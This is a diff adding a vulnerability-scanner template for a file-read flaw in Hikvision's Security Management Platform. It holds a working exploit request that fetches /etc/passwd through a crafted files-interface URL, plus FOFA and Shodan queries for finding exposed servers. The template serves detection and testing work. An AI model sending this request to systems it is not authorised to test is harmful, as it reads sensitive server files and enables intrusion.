@@ -1,0 +1,38 @@
+id: hikvision-iSecureCenter-fileread
+
+info:
+  name: Hikvision Security Management Platform files Read Vulnerability
+  author: Co5mos
+  severity: high
+  description: |
+    The vulnerability exists in the Hikvision Security Management Platform, where an attacker can construct a specific HTTP request to exploit the file read vulnerability through the files interface to obtain sensitive files on the server, such as /etc/passwd, leading to server information disclosure.
+  reference:
+    - https://www.wevul.com/5432.html
+    - https://blog.csdn.net/qq_37113223/article/details/135739893
+  metadata:
+    fofa-query: body="/portal/skin/isee/redblack/"
+    shodan-query: http.html:"/portal/skin/isee/redblack/"
+  tags: hikvision, fileread
+
+http:
+  - raw:
+      - |
+        GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Cache-Control: max-age=0
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
